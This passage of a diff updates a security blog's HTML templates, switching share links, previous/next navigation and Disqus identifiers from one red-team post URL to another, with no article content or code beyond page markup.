-        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f09%2fautomated-red-team-infrastructure-deployment-with-terraform---part-2%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f02%2fvhd-to-da%2f">
           <i class="fa fa-google-plus"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f09%2fautomated-red-team-infrastructure-deployment-with-terraform---part-2%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f02%2fvhd-to-da%2f">
           <i class="fa fa-facebook-official"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f09%2fautomated-red-team-infrastructure-deployment-with-terraform---part-2%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f02%2fvhd-to-da%2f">
           <i class="fa fa-twitter"></i>
         </a>
       </li>
@@ -648,7 +822,7 @@ drwxr-xr-x 2  501 dialout     4096 Sep 21 02:49 third-party/
       
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/02/vhd-to-da/" data-tooltip="VHD to DA">
+            <a class="post-action-btn btn btn--disabled">
           
             <i class="fa fa-angle-left"></i>
             <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -656,7 +830,7 @@ drwxr-xr-x 2  501 dialout     4096 Sep 21 02:49 third-party/
         </li>
         <li class="post-action">
           
-            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/" data-tooltip="Jumping Network Segregation with RDP">
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2017/09/automated-red-team-infrastructure-deployment-with-terraform---part-2/" data-tooltip="Automated Red Team Infrastructure Deployment with Terraform - Part 2">
           
             <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
             <i class="fa fa-angle-right"></i>
@@ -673,17 +847,17 @@ drwxr-xr-x 2  501 dialout     4096 Sep 21 02:49 third-party/
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f09%2fautomated-red-team-infrastructure-deployment-with-terraform---part-2%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f02%2fvhd-to-da%2f">
           <i class="fa fa-google-plus"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f09%2fautomated-red-team-infrastructure-deployment-with-terraform---part-2%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f02%2fvhd-to-da%2f">
           <i class="fa fa-facebook-official"></i>
         </a>
       </li>
       <li class="post-action hide-xs">
-        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f09%2fautomated-red-team-infrastructure-deployment-with-terraform---part-2%2f">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f02%2fvhd-to-da%2f">
           <i class="fa fa-twitter"></i>
         </a>
       </li>
@@ -710,17 +884,17 @@ drwxr-xr-x 2  501 dialout     4096 Sep 21 02:49 third-party/
       <div id="share-options-bar" class="share-options-bar" data-behavior="4">
   <ul class="share-options">
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2017%2f09%2fautomated-red-team-infrastructure-deployment-with-terraform---part-2%2f">
+      <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f02%2fvhd-to-da%2f">
         <i class="fa fa-google-plus"></i><span>Share on Google Plus</span>
       </a>
     </li>
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2017%2f09%2fautomated-red-team-infrastructure-deployment-with-terraform---part-2%2f">
+      <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f02%2fvhd-to-da%2f">
         <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
       </a>
     </li>
     <li class="share-option">
-      <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2017%2f09%2fautomated-red-team-infrastructure-deployment-with-terraform---part-2%2f">
+      <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f02%2fvhd-to-da%2f">
         <i class="fa fa-twitter"></i><span>Share on Twitter</span>
       </a>
     </li>
@@ -1005,9 +1179,9 @@ $(document).ready(function() {
     
       <script>
         var disqus_config = function () {
-          this.page.url = 'https:\/\/rastamouse.me\/2017\/09\/automated-red-team-infrastructure-deployment-with-terraform---part-2\/';
+          this.page.url = 'https:\/\/rastamouse.me\/2018\/02\/vhd-to-da\/';
           
-            this.page.identifier = '\/2017\/09\/automated-red-team-infrastructure-deployment-with-terraform---part-2\/'
+            this.page.identifier = '\/2018\/02\/vhd-to-da\/'
           
         };
         (function() {
